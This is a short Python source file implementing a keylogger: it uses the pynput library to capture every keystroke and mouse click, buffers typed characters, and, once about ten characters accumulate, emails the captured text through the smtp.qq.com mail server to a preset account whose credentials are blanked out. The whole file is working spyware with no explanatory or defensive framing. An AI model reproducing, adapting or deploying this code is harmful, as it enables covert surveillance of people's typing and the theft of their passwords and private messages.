import smtplib
import pynput
from pynput.keyboard import Key, Listener
from pynput import keyboard, mouse
from email.mime.text import MIMEText

email = ""
password = ""
server = smtplib.SMTP("smtp.qq.com", 587)
server.ehlo()
server.starttls()
server.login(email, password)
message =""
name="check\n"
long=10
def on_mouse_click(x, y, button, pressed):
    global message
    global long
    if pressed:
        if len(message) >= long:
            send()
            message = ""
def on_keyboard_press(key):
    global message
    global long
    global name
    temp = f"{key}"
    if temp[0] == '\'':
        temp = temp[1:-1]
    else:
        temp=" "+temp+" "
    if key == Key.enter:
        if len(message) >= long:
            send()
            message =""
    elif key == Key.backspace:
        message=message[:-1]
    elif len(temp)==1:
        message+=temp
def send():
    msg = MIMEText(name + message)
    msg["From"] = email
    msg["To"] = email
    msg["Subject"] = name
    server.sendmail(
        email,
        email,
        msg.as_string()
    )

keyboard_listener = keyboard.Listener(on_press=on_keyboard_press)

mouse_listener = mouse.Listener(on_click=on_mouse_click)

keyboard_listener.start()
mouse_listener.start()

keyboard_listener.join()
mouse_listener.join()